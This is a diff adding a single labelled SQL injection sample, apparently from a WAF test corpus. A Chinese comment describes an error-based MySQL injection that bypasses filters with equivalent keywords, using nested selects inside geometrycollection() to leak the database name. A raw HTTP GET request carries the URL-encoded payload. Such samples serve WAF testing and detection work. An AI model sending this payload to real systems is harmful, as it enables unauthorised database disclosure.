@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入(等价关键字绕过)-06506279
+# 基于报错注入进行等价关键字绕过注入，该SQL注入语句的攻击目的是获取数据库中的数据库名称。该注入语句的核心是执行子查询(select database())来获取当前数据库的名称。通过嵌套查询(select * from(select * from(select database())a)b)将数据库名称作为结果集中的一行数据。然后，将该结果集作为参数传递给geometrycollection函数，从而形成一个几何集合对象，利用geometrycollection函数来获取数据库中的数据库名称。
+GET /?id=1%20and%20geometrycollection%28%28select%20%2A%20from%28select%20%2A%20from%28select%20database%28%29%29a%29b%29%29%20%20&bid=hd_tag_m8mv24br HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24br
+RM-PRO-Token: 17001a13de16a35f6f45aca6da47986c
+RM-PRO-Time: 1742808373648
+User-Agent: curl/7.83.1
+
